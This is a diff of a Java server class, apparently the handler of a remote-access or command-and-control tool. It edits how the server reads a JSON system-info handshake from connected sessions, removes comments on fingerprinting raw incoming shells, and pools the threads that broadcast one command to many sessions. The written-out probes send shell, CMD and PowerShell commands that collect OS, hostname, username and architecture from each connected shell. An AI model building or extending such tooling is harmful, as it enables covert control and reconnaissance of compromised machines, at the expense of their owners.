@@ -135,30 +135,27 @@ public abstract class BaseServer {
 
     protected Map<String, Object> RavenHandshake(InputStream In, OutputStream Out, int TimeoutMs, SymmetricCryptography Crypto) throws Exception {
         ByteArrayOutputStream Buf = new ByteArrayOutputStream();
-        long Dead = System.currentTimeMillis() + TimeoutMs;
         int Depth = 0;
-        boolean InStr = false,
-            Esc = false,
-            Started = false;
+        boolean InStr = false, Esc = false, Started = false;
+        long Dead = System.currentTimeMillis() + TimeoutMs;
         while (System.currentTimeMillis() < Dead) {
-            if (In.available() > 0) {
-                int B = In.read();
-                if (B == -1) break;
-                Buf.write(B);
-                char Ch = (char) B;
-                if (Esc) Esc = false;
-                else if (Ch == '\\' && InStr) Esc = true;
-                else if (Ch == '"') InStr = !InStr;
-                else if (!InStr) {
-                    if (Ch == '{') {
-                        Depth++;
-                        Started = true;
-                    } else if (Ch == '}') Depth--;
-                }
-                if (Started && Depth == 0) break;
-            } else {
-                Thread.sleep(30);
+            int B;
+            try {
+                B = In.read();
+            } catch (java.net.SocketTimeoutException Ignored) {
+                break;
             }
+            if (B == -1) break;
+            Buf.write(B);
+            char Ch = (char) B;
+            if (Esc) Esc = false;
+            else if (Ch == '\\' && InStr) Esc = true;
+            else if (Ch == '"') InStr = !InStr;
+            else if (!InStr) {
+                if (Ch == '{') { Depth++; Started = true; }
+                else if (Ch == '}') Depth--;
+            }
+            if (Started && Depth == 0) break;
         }
         String Json = Buf.toString(StandardCharsets.UTF_8).trim();
         if (!Json.startsWith("{")) throw new IOException("expected JSON sysinfo, got: " + (Json.length() > 64 ? Json.substring(0, 64) + "…" : Json));
@@ -171,18 +168,6 @@ public abstract class BaseServer {
         return Info;
     }
 
-    // ── Raw Shell Handshake — OS fingerprinting ─────────────────────────────
-    // The probe uses a SPLIT MARKER via shell variable concatenation:
-    //   A=RVNOS; B=ID; ... echo $A$B:$OS:$HN:$WH:$AR
-    // A PTY shell echoes the raw command text before executing it.
-    // The command text contains "$A$B" (unresolved), NOT "RVNOSID:", so the
-    // echo of the command never triggers a false marker match.
-    // "RVNOSID:" appears ONLY in the actual output after execution.
-    //
-    // Probe sequence: Linux/POSIX → Windows CMD → PowerShell (only if CMD fails)
-    // Each failed attempt drains residual output before the next attempt, so
-    // probe responses never bleed into subsequent exec commands.
-    // ─────────────────────────────────────────────────────────────────────────
     private static final String MKR_A  = "RVNOS";
     private static final String MKR_B  = "ID";
     private static final String MARKER = MKR_A + MKR_B + ":";
@@ -198,13 +183,9 @@ public abstract class BaseServer {
 
         OutputStream Out = Sock.getOutputStream();
         try {
-            // Drain banner/prompt the shell sends on connect
+
             DrainSocket(Sock, In);
 
-            // ── Linux / POSIX probe ───────────────────────────────────
-            // Variable assignments ensure $() substitution runs even in
-            // minimal sh/dash/netcat shells.  $A$B in the echo arg means
-            // the literal marker never appears in the command echo text.
             String LinuxProbe =
                 "A=" + MKR_A + ";B=" + MKR_B + ";" +
                 "OS=$(uname -s);" +
@@ -224,10 +205,8 @@ public abstract class BaseServer {
                 return Info;
             }
 
-            // Drain residual output from failed Linux probe
             DrainSocket(Sock, In);
 
-            // ── Windows CMD probe ─────────────────────────────────────
             String CmdProbe = "cmd /c echo " + MKR_A + MKR_B + ":WIN:%COMPUTERNAME%:%USERNAME%:%PROCESSOR_ARCHITECTURE%";
             Out.write((CmdProbe + "\n").getBytes(StandardCharsets.UTF_8));
             Out.flush();
@@ -241,10 +220,8 @@ public abstract class BaseServer {
                 return Info;
             }
 
-            // Drain before PowerShell — only attempt PS if CMD also failed
             DrainSocket(Sock, In);
 
-            // ── Windows PowerShell probe ──────────────────────────────
             String PsProbe =
                 "powershell -NoProfile -Command " +
                 "\"Write-Host ('" + MKR_A + MKR_B + ":WIN:'" +
@@ -261,7 +238,6 @@ public abstract class BaseServer {
                 return Info;
             }
 
-            // All probes exhausted — drain everything before session starts
             DrainSocket(Sock, In);
             Logger.Warn("raw probe: fingerprint exhausted from " + RemoteAddr + " — Unknown info");
 
@@ -276,8 +252,6 @@ public abstract class BaseServer {
         return Info;
     }
 
-    // Block-read until a line starting with Marker is found, return text after Marker.
-    // Uses setSoTimeout (blocking read) — more reliable than available() polling.
     private static String AwaitMarker(Socket Sock, InputStream In,
                                        String Marker, int TimeoutMs) throws Exception {
         Sock.setSoTimeout(TimeoutMs);
@@ -494,15 +468,22 @@ public abstract class BaseServer {
 
     public Map<Integer, String[]> BroadcastCommand(List<Integer> SessionIds, String Command) {
         Map<Integer, String[]> Results = new ConcurrentHashMap<>();
+        java.util.concurrent.ExecutorService BroadcastPool = java.util.concurrent.Executors.newCachedThreadPool(Task -> {
+            Thread Worker = new Thread(Task, "BroadcastWorker");
+            Worker.setDaemon(true);
+            return Worker;
+        });
         List<CompletableFuture<Void>> Futures = new ArrayList<>();
         for (int Id : SessionIds) {
-            CompletableFuture<Void> F = CompletableFuture.runAsync(() -> Results.put(Id, ExecuteCommand(Id, Command)));
-            Futures.add(F);
+            CompletableFuture<Void> Future = CompletableFuture.runAsync(() -> Results.put(Id, ExecuteCommand(Id, Command)), BroadcastPool);
+            Futures.add(Future);
         }
         try {
             CompletableFuture.allOf(Futures.toArray(new CompletableFuture[0])).get(Config.GetCommandTimeout() + 5000, TimeUnit.MILLISECONDS);
         } catch (Exception E) {
             Logger.Warn("Broadcast partial timeout: " + E.getMessage());
+        } finally {
+            BroadcastPool.shutdownNow();
         }
         return Results;
     }
